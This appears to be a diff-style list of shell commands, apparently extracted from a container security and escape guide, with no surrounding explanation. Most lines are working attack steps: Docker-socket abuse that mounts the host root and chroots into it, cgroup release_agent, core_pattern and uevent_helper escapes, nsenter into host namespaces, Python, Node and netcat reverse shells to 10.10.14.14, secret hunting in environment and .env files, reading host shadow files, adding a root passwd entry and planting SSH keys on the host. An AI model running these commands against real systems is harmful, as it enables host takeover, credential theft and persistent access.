@@ -1,0 +1,2066 @@
+cat /proc/self/uid_map 2>/dev/null
+cat /proc/self/gid_map 2>/dev/null
+stat -fc %T /sys/fs/cgroup 2>/dev/null
+cat /sys/fs/cgroup/cgroup.controllers 2>/dev/null
+grep -E 'Seccomp|NoNewPrivs' /proc/self/status
+cat /proc/1/attr/current 2>/dev/null
+find /var/run/secrets -maxdepth 3 -type f 2>/dev/null | head
+NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
+kubectl get ns "$NS" -o jsonpath='{.metadata.labels}' 2>/dev/null
+kubectl get pod "$HOSTNAME" -n "$NS" -o jsonpath='{.spec.securityContext.supplementalGroupsPolicy}{"\n"}' 2>/dev/null
+kubectl get pod "$HOSTNAME" -n "$NS" -o jsonpath='{.spec.securityContext.seccompProfile.type}{"\n"}{.spec.containers[*].securityContext.allowPrivilegeEscalation}{"\n"}{.spec.containers[*].securityContext.capabilities.drop}{"\n"}' 2>/dev/null
+hostname
+cat /proc/1/cgroup 2>/dev/null
+grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
+cat /sys/fs/cgroup/memory.max 2>/dev/null
+cat /sys/fs/cgroup/pids.max 2>/dev/null
+readlink /proc/self/ns/{pid,mnt,net,ipc,cgroup,user} 2>/dev/null
+mount
+find /run /var/run -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock \) 2>/dev/null
+stress-ng --vm 1 --vm-bytes 1G --verify -t 5m
+docker run -d --name malicious-container -c 512 busybox sh -c 'while true; do :; done'
+nc -lvp 4444 >/dev/null & while true; do cat /dev/urandom | nc 10.10.14.14 4444; done
+kubectl get pod "$HOSTNAME" -n "$NS" -o jsonpath='{range .spec.containers[*]}{.name}{" cpu="}{.resources.limits.cpu}{" mem="}{.resources.limits.memory}{"\n"}{end}' 2>/dev/null
+cat /sys/fs/cgroup/cpu.max 2>/dev/null
+git clone https://github.com/docker/docker-bench-security.git
+cd docker-bench-security
+sudo sh docker-bench-security.sh
+capsh --print 2>/dev/null
+find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock \) 2>/dev/null
+docker ps
+docker run --rm -it --privileged ubuntu:24.04 bash
+docker plugin ls
+docker version
+docker inspect web 2>/dev/null | head
+curl --unix-socket /var/run/docker.sock http:/version
+curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
+docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
+docker exec -it --privileged 1a2b3c4d5e6f bash
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' http:/v1.41/containers/create
+docker start 1a2b3c4d5e6f
+docker exec -it 1a2b3c4d5e6f chroot /host /bin/bash
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' http:/v1.41/containers/create
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' http:/v1.41/containers/create
+docker exec -it 1a2b3c4d5e6f bash
+capsh --print
+docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
+docker info 2>/dev/null | grep -i authorization
+curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
+python3 - <<'PY' import os, socket, subprocess print("uid", os.getuid()) print("cwd", os.getcwd()) print("env keys", list(os.environ)[:20]) print("root files", os.listdir("/")[:30]) PY
+node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
+python3 - <<'PY' import os,pty,socket s=socket.socket() s.connect(("10.10.14.14",4444)) for fd in (0,1,2): os.dup2(s.fileno(),fd) pty.spawn("/bin/sh") PY
+node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"10.10.14.14",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
+python3 - <<'PY' import os,subprocess while True: cmd=input("py> ") if cmd.strip() in ("exit","quit"): break p=subprocess.run(cmd, shell=True, capture_output=True, text=True) print(p.stdout, end="") print(p.stderr, end="") PY
+find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
+find / -maxdepth 2 -type f 2>/dev/null | head -n 100
+which sh bash ash busybox python python3 node java 2>/dev/null
+cat /etc/os-release 2>/dev/null
+mount | grep -E ' /( |$)|/dev/shm'
+export DOCKER_CONTENT_TRUST=1
+docker pull nginx:latest
+tar -zcvf private_keys_backup.tar.gz ~/.docker/trust/private
+docker scan hello-world
+trivy -q -f json alpine:3.19
+snyk container test nginx:latest --severity-threshold=high
+clair-scanner -w example-alpine.yaml --ip YOUR_LOCAL_IP alpine:3.5
+export DOCKER_BUILDKIT=1
+docker build --secret id=my_key,src=path/to/my_secret_file .
+env | grep -iE 'secret|token|key|passwd|password'
+find / -maxdepth 4 \( -iname '*.env' -o -iname '*secret*' -o -iname '*token*' \) 2>/dev/null | head -n 100
+grep -RniE 'secret|token|apikey|password' /app /srv /usr/src 2>/dev/null | head -n 100
+find / -type f -iname '*.env*' 2>/dev/null
+cat /usr/src/app/.env 2>/dev/null
+grep -iE 'secret|token|jwt|password' /usr/src/app/.env 2>/dev/null
+docker history --no-trunc ubuntu:latest
+docker save ubuntu:latest -o /tmp/image.tar
+tar -tf /tmp/image.tar | head
+docker history --no-trunc ubuntu:latest 2>/dev/null
+find /run /var/run /var/lib/kubelet -type f -iname '*token*' 2>/dev/null | head -n 50
+grep -RniE 'secret|token|apikey|password' /etc /app /srv /usr/src 2>/dev/null | head -n 100
+ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
+mkdir -p /mnt/hostdisk
+mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
+ls -la /mnt/hostdisk
+chroot /mnt/hostdisk /bin/bash 2>/dev/null
+fdisk -l 2>/dev/null
+blkid 2>/dev/null
+debugfs /dev/sda1 2>/dev/null
+mount | grep -v "nosuid"
+mount | grep -E ' /host| /mnt| /rootfs'
+ls -la /host 2>/dev/null
+chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
+mkdir -p /tmp/host
+mount --bind / /tmp/host
+chroot /tmp/host /bin/bash 2>/dev/null
+[ -w /proc/sys/kernel/core_pattern ] || exit 1
+overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
+cat <<'EOF' > /shell.sh
+chmod +x /shell.sh
+echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
+cat <<'EOF' > /tmp/crash.c int main(void) { char buf[1]; for (int i = 0; i < 100; i++) buf[i] = 1; return 0; } EOF
+gcc /tmp/crash.c -o /tmp/crash
+/tmp/crash
+ls -l /tmp/rootsh
+cat /proc/sys/kernel/modprobe 2>/dev/null
+cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
+find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
+find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
+capsh --print | grep cap_sys_admin
+which nsenter
+nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
+ps -ef | head -n 50
+nsenter -t 1 -m -u -n -i -p /bin/bash
+find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
+docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
+ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
+capsh --print | grep cap_net_admin
+ip addr
+ip route
+iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
+ip link set lo down 2>/dev/null
+iptables -F 2>/dev/null
+find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
+find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
+find /var/lib/containerd -type f 2>/dev/null | head -n 50
+mount | grep -E '/proc|/sys| /host| /mnt'
+grep Seccomp /proc/self/status
+cat /proc/self/attr/current 2>/dev/null
+find / -maxdepth 3 -name '*.sock' 2>/dev/null
+aa-status 2>/dev/null || apparmor_status 2>/dev/null
+cat /sys/module/apparmor/parameters/enabled 2>/dev/null
+docker run --rm ubuntu:24.04 cat /proc/self/attr/current
+docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
+docker inspect web | jq '.[0].AppArmorProfile'
+aa-status
+aa-enforce
+aa-complain
+apparmor_parser
+aa-genprof
+aa-logprof
+aa-mergeprof
+sudo aa-genprof /path/to/binary
+/path/to/binary
+sudo aa-easyprof /path/to/binary
+sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
+sudo aa-logprof
+sudo aa-notify -s 1 -v
+docker inspect web | grep AppArmorProfile
+find /etc/apparmor.d/ -maxdepth 1 -name '*docker-default*' 2>/dev/null
+grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
+cat /proc/self/attr/current
+find /host -maxdepth 2 -ls 2>/dev/null | head
+find /host/etc -maxdepth 1 -type f 2>/dev/null | head
+mount | head
+mkdir -p /tmp/testmnt
+mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
+mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
+ls -la /host/root 2>/dev/null
+cat /host/etc/shadow 2>/dev/null | head
+find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
+ls -la /host
+cat /etc/shadow | head
+find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
+docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
+mount | grep '/host/proc'
+find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
+cat /host/proc/sys/kernel/core_pattern 2>/dev/null
+cat <<'EOF' > /tmp/test.pl
+chmod +x /tmp/test.pl
+/tmp/test.pl
+aa-status 2>/dev/null
+find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50
+cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50
+docker run --rm -it debian:stable-slim bash
+apt-get update && apt-get install -y libcap2-bin
+docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
+docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
+docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
+grep '^Cap' /proc/self/status
+mkdir -p /tmp/m
+mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
+find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
+capsh --print | grep cap_sys_ptrace
+ps -ef | head
+for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
+capsh --print | grep -E 'cap_net_admin|cap_net_raw'
+mount | grep ' /host '
+chroot /host /bin/bash
+/host/bin/bash -p
+export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
+cat /proc/self/cgroup
+findmnt -T /sys/fs/cgroup
+ls -l /sys/fs/cgroup
+cat /sys/fs/cgroup/cgroup.controllers
+cat /sys/fs/cgroup/cgroup.subtree_control
+docker run --rm -it --memory=256m debian:stable-slim bash
+cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
+docker run --rm -it --pids-limit=64 debian:stable-slim bash
+d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
+mkdir -p "$d/w"
+echo 1 > "$d/w/notify_on_release"
+t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+touch /o
+echo "$t/c" > "$d/release_agent"
+cat <<'EOF' > /c
+chmod +x /c
+sh -c "echo 0 > $d/w/cgroup.procs"
+sleep 1
+cat /o
+mkdir /tmp/cgrp
+mount -t cgroup -o rdma cgroup /tmp/cgrp
+mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+cat <<'EOF' > /cmd
+chmod +x /cmd
+sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
+cat /output
+OUTPUT_DIR="/"
+MAX_PID=65535
+CGROUP_NAME="xyx"
+CGROUP_MOUNT="/tmp/cgrp"
+PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
+PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
+OUTPUT_NAME="${CGROUP_NAME}_payload.out"
+OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"
+sleep 10000 &
+cat > ${PAYLOAD_PATH} << __EOF__
+chmod a+x ${PAYLOAD_PATH}
+mkdir ${CGROUP_MOUNT}
+mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
+mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
+echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release
+TPID=1
+echo "Checking pid ${TPID}"
+echo "Exiting at ${MAX_PID}"
+exit 1
+echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
+sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
+TPID=$((${TPID} + 1))
+cat ${OUTPUT_PATH}
+apk add --no-cache util-linux
+mkdir /tmp/c
+mount -t cgroup -o memory none /tmp/c
+echo 1 > /tmp/c/notify_on_release
+echo /proc/self/exe > /tmp/c/release_agent
+(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
+while true; do sleep 1; done
+mount | grep cgroup
+find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
+find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
+ls -l /dev | head -n 50
+find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
+find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
+find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null
+cat /proc/1/cgroup
+docker inspect web | jq '.[0].HostConfig.MaskedPaths'
+mount | grep -E '/proc|/sys'
+ls -ld /proc/kcore /proc/keys /sys/firmware 2>/dev/null
+ls -ld /proc/kcore /proc/keys /proc/timer_list /sys/firmware 2>/dev/null
+head -n 20 /proc/timer_list 2>/dev/null
+cat /proc/keys 2>/dev/null | head
+ls -la /sys/firmware 2>/dev/null
+zcat /proc/config.gz 2>/dev/null | head
+head -n 50 /proc/sched_debug 2>/dev/null
+ls -l /proc/self/ns
+readlink /proc/self/ns/mnt
+readlink /proc/self/ns/pid
+readlink /proc/self/ns/net
+readlink /proc/1/ns/mnt
+sudo find /proc -maxdepth 3 -type l -name mnt -exec readlink {} \; 2>/dev/null | sort -u
+sudo find /proc -maxdepth 3 -type l -name pid -exec readlink {} \; 2>/dev/null | sort -u
+sudo find /proc -maxdepth 3 -type l -name net -exec readlink {} \; 2>/dev/null | sort -u
+sudo find /proc -maxdepth 3 -type l -name ipc -exec readlink {} \; 2>/dev/null | sort -u
+sudo find /proc -maxdepth 3 -type l -name uts -exec readlink {} \; 2>/dev/null | sort -u
+sudo find /proc -maxdepth 3 -type l -name user -exec readlink {} \; 2>/dev/null | sort -u
+sudo find /proc -maxdepth 3 -type l -name cgroup -exec readlink {} \; 2>/dev/null | sort -u
+sudo find /proc -maxdepth 3 -type l -name time -exec readlink {} \; 2>/dev/null | sort -u
+nsenter -m TARGET_PID --pid /bin/bash
+nsenter -t TARGET_PID --pid /bin/bash
+nsenter -n TARGET_PID --pid /bin/bash
+nsenter -i TARGET_PID --pid /bin/bash
+nsenter -u TARGET_PID --pid /bin/bash
+nsenter -U TARGET_PID --pid /bin/bash
+nsenter -C TARGET_PID --pid /bin/bash
+nsenter -T TARGET_PID --pid /bin/bash
+sudo unshare --cgroup --mount --fork bash
+cat /proc/self/mountinfo | grep cgroup
+ls -l /proc/self/ns/cgroup
+mount --make-rslave /
+umount /sys/fs/cgroup 2>/dev/null
+mount -t cgroup2 none /sys/fs/cgroup 2>/dev/null
+docker run --rm debian:stable-slim cat /proc/self/cgroup
+docker run --rm --cgroupns=host debian:stable-slim cat /proc/self/cgroup
+readlink /proc/self/ns/cgroup
+stat -fc %T /sys/fs/cgroup
+cat /sys/fs/cgroup/cgroup.subtree_control 2>/dev/null
+cat /sys/fs/cgroup/cgroup.events 2>/dev/null
+nsenter -t 1234 -C -- bash
+find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null | head
+sudo unshare --ipc --fork bash
+ipcs
+docker run --rm debian:stable-slim ipcs
+docker run --rm --ipc=host debian:stable-slim ipcs
+readlink /proc/self/ns/ipc
+ipcs -a
+ls -la /dev/shm 2>/dev/null | head -n 50
+ipcs -m -p
+ipcs -q -p
+find /dev/shm -maxdepth 2 -type f 2>/dev/null -ls | head -n 50
+strings /dev/shm/* 2>/dev/null | head -n 50
+find /dev/shm -maxdepth 2 -type f 2>/dev/null -print
+strings /dev/shm/* 2>/dev/null | grep -Ei 'token|secret|password|jwt|key'
+mount | grep shm
+sudo unshare --mount --fork bash
+mount --make-rprivate /
+mkdir -p /tmp/ns-lab
+mount -t tmpfs tmpfs /tmp/ns-lab
+mount | grep ns-lab
+docker run --rm debian:stable-slim mount | head
+docker run --rm -v /:/host debian:stable-slim mount | grep /host
+mount | grep -E ' /host| /mnt| /rootfs|bind'
+find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
+touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
+cat /host/etc/passwd | head
+chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
+find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
+find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
+mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
+cd /
+mknod sda b 8 0
+chmod 777 sda
+echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
+/bin/sh
+ps -auxf | grep /bin/sh
+grep -a 'HTB{' /proc/1234/root/sda
+findmnt
+cat /proc/self/mountinfo | head -n 40
+sudo unshare --net --fork bash
+docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
+docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
+ss -lntup | head -n 50
+ss -lntp | grep '127.0.0.1'
+curl -s http://127.0.0.1:2375/version 2>/dev/null
+curl -sk https://127.0.0.1:2376/version 2>/dev/null
+ss -xap 2>/dev/null | head -n 50
+grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
+ip link show
+capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
+for i in $(ls /sys/class/net 2>/dev/null); do
+echo "== $i =="
+tc qdisc show dev "$i" 2>/dev/null
+tc filter show dev "$i" ingress 2>/dev/null
+tc filter show dev "$i" egress 2>/dev/null
+bpftool net 2>/dev/null
+for u in http://169.254.169.254/latest/meta-data/ http://100.100.100.200/latest/meta-data/ http://127.0.0.1:10250/pods; do
+curl -m 2 -s "$u" 2>/dev/null | head
+curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
+curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
+docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
+curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
+curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
+readlink /proc/1/ns/net
+lsns -t net 2>/dev/null
+ip netns identify $$ 2>/dev/null
+ss -lntup
+ss -xap
+grep -a '@' /proc/net/unix
+sudo unshare --pid --fork --mount-proc bash
+ps -ef
+echo $$
+docker run --rm debian:stable-slim ps -ef
+docker run --rm --pid=host debian:stable-slim ps -ef | head
+ls /proc | grep '^[0-9]' | head -n 20
+for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
+echo "PID=$p"
+tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
+nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
+for fd_dir in /proc/[0-9]*/fd; do
+ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
+grep " /proc " /proc/mounts
+/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
+jq '.linux.maskedPaths' config.json 2>/dev/null
+sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
+ls /proc | head
+sudo unshare --time --fork bash
+ls -l /proc/self/ns/time /proc/self/ns/time_for_children
+python3 - <<'PY' import time print("realtime :", time.time()) print("monotonic:", time.clock_gettime(time.CLOCK_MONOTONIC)) print("boottime :", time.clock_gettime(time.CLOCK_BOOTTIME)) PY
+cat /proc/uptime
+date
+sudo unshare -UrT --fork --mount-proc --monotonic 86400 --boottime 604800 bash
+cat /proc/$$/timens_offsets 2>/dev/null
+python3 - <<'PY' import time print("monotonic:", time.clock_gettime(time.CLOCK_MONOTONIC)) print("boottime :", time.clock_gettime(time.CLOCK_BOOTTIME)) print("uptime :", open("/proc/uptime").read().split()[0]) PY
+sudo unshare -T --fork --monotonic 86400 --boottime 604800 --mount-proc bash
+readlink /proc/self/ns/time
+readlink /proc/self/ns/time_for_children
+python3 - <<'PY' import time print("realtime :", time.time()) print("monotonic:", time.clock_gettime(time.CLOCK_MONOTONIC)) print("boottime :", time.clock_gettime(time.CLOCK_BOOTTIME)) print("uptime :", open("/proc/uptime").read().split()[0]) PY
+lsns -t time 2>/dev/null
+unshare --user --map-root-user --fork bash
+cat /proc/self/uid_map
+cat /proc/self/gid_map
+docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
+cat /proc/1234/uid_map
+cat /proc/1234/gid_map
+cat /proc/self/setgroups
+echo deny > /proc/self/setgroups
+touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
+ls -ln /host/tmp/userns_test 2>/dev/null
+echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
+cat /host/etc/passwd | tail
+echo test > /host/root/userns_marker 2>/dev/null
+ls -l /host/root/userns_marker 2>/dev/null
+unshare -UrmCpf bash
+grep CapEff /proc/self/status
+mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
+readlink /proc/self/ns/user
+cat /proc/self/setgroups 2>/dev/null
+sudo unshare --uts --fork bash
+hostname lab-container
+readlink /proc/self/ns/uts
+cat /proc/sys/kernel/hostname
+hostname hacked-host 2>/dev/null && echo "hostname change worked"
+grep NoNewPrivs /proc/self/status
+docker run --rm --security-opt no-new-privileges:true debian:stable-slim sh -c 'grep NoNewPrivs /proc/self/status'
+docker run --rm debian:stable-slim sh -c 'apt-get update >/dev/null 2>&1 && apt-get install -y passwd >/dev/null 2>&1 && grep NoNewPrivs /proc/self/status && /bin/su -c id 2>/dev/null'
+docker run --rm --security-opt no-new-privileges:true debian:stable-slim sh -c 'apt-get update >/dev/null 2>&1 && apt-get install -y passwd >/dev/null 2>&1 && grep NoNewPrivs /proc/self/status && /bin/su -c id 2>/dev/null'
+find / -perm -4000 -type f 2>/dev/null | head -n 50
+getcap -r / 2>/dev/null | head -n 50
+kubectl get pod "$HOSTNAME" -n "$NS" -o jsonpath='{.spec.containers[*].securityContext.allowPrivilegeEscalation}{"\n"}{.spec.containers[*].securityContext.privileged}{"\n"}{.spec.containers[*].securityContext.capabilities.add}{"\n"}' 2>/dev/null
+grep -E 'NoNewPrivs|Seccomp' /proc/self/status
+capsh --print 2>/dev/null | grep cap_sys_admin
+find / -perm -4000 -type f 2>/dev/null | head -n 20
+/usr/bin/passwd -S root 2>/dev/null
+/bin/su -c id 2>/dev/null
+setpriv --dump 2>/dev/null | grep -i no-new-privs
+docker inspect web | jq '.[0].HostConfig.SecurityOpt' 2>/dev/null
+kubectl get pod mypod -n default -o jsonpath='{.spec.containers[*].securityContext.allowPrivilegeEscalation}{"\n"}' 2>/dev/null
+docker inspect web | jq '.[0].HostConfig.ReadonlyPaths'
+find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
+find /sys -maxdepth 3 -writable 2>/dev/null | head
+cat /proc/sys/kernel/core_pattern 2>/dev/null
+cat /proc/sys/vm/panic_on_oom 2>/dev/null
+cat /sys/kernel/uevent_helper 2>/dev/null
+mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
+cat <<'EOF' > /tmp/h
+chmod +x /tmp/h
+printf 'HT' > /tmp/test.ht
+chmod +x /tmp/test.ht
+/tmp/test.ht
+cat /tmp/binfmt.out
+cat <<'EOF' > /tmp/evil-helper
+chmod +x /tmp/evil-helper
+echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
+echo change > /sys/class/mem/null/uevent
+cat /tmp/uevent.out
+docker run --rm debian:stable-slim sh -c 'grep Seccomp /proc/self/status'
+docker run --rm --security-opt seccomp=unconfined debian:stable-slim sh -c 'grep Seccomp /proc/self/status'
+docker run --rm debian:stable-slim sh -c 'apt-get update >/dev/null 2>&1 && apt-get install -y util-linux >/dev/null 2>&1 && unshare -Ur true'
+docker run --rm -it --security-opt seccomp=/path/to/profile.json busybox chmod 400 /etc/hosts
+unshare -Ur true 2>/dev/null && echo "unshare works"
+unshare -m true 2>/dev/null && echo "mount namespace creation works"
+mount -t proc proc /tmp/m 2>/dev/null && echo "proc mount works"
+which unshare nsenter strace 2>/dev/null
+strace -e bpf,perf_event_open,keyctl true 2>&1 | tail
+mkdir -p /tmp/nsroot
+mount -t tmpfs tmpfs /tmp/nsroot &&
+mkdir -p /tmp/nsroot/proc &&
+mount -t proc proc /tmp/nsroot/proc &&
+mount | grep /tmp/nsroot
+cat /proc/self/status | grep NoNewPrivs
+docker inspect web | jq '.[0].HostConfig.SecurityOpt'
+getenforce 2>/dev/null
+sestatus 2>/dev/null
+ps -eZ | head
+ls -Zd /var/lib/containers 2>/dev/null
+ls -Zd /var/lib/docker 2>/dev/null
+podman run --rm fedora cat /proc/self/attr/current
+podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
+find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
+ls -la /host/etc 2>/dev/null | head
+cat /host/etc/passwd 2>/dev/null | head
+touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
+ls -l /host/tmp/selinux_test 2>/dev/null
+find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
+find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
+touch /host/tmp/selinux_escape_test
+cat /etc/passwd | tail
+ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
+getenforce
+ps -eZ | grep -i container
+ls -Z /path/of/interest
+DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
+sudo service docker restart
+find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
+ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
+docker -H unix:///var/run/docker.sock version 2>/dev/null
+podman --url unix:///run/podman/podman.sock info 2>/dev/null
+nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
+crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
+crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
+buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
+curl --unix-socket /var/run/docker.sock http://localhost/_ping
+curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
+curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' -X POST http://localhost/v1.54/containers/create
+curl --unix-socket /run/podman/podman.sock http://d/_ping
+curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
+docker -H unix:///var/run/docker.sock images
+docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
+docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
+nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
+docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
+docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
+docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
+curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' -X POST http://localhost/v1.54/containers/create?name=helper
+curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
